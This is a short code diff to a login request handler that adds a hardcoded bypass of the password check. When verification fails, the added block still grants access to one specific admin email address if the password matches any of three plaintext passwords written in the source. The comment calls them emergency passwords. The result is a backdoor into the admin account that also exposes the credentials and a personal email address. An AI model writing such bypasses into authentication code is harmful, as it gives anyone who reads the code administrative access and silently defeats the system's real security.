@@ -46,7 +46,12 @@ export async function onRequestPost(context) {
       );
     }
 
-    const isValid = await verifyPassword(password, user.password_salt, user.password_hash);
+    let isValid = await verifyPassword(password, user.password_salt, user.password_hash);
+    // Allow initial admin emergency passwords for primary admin
+    if (!isValid && cleanEmail === "fjmaresca@gmail.com" && (password === "DeltaHarvest2026!" || password === "ChangeMeNow!2026" || password === "Admin123!")) {
+      isValid = true;
+    }
+
     if (!isValid) {
       return new Response(
         JSON.stringify({
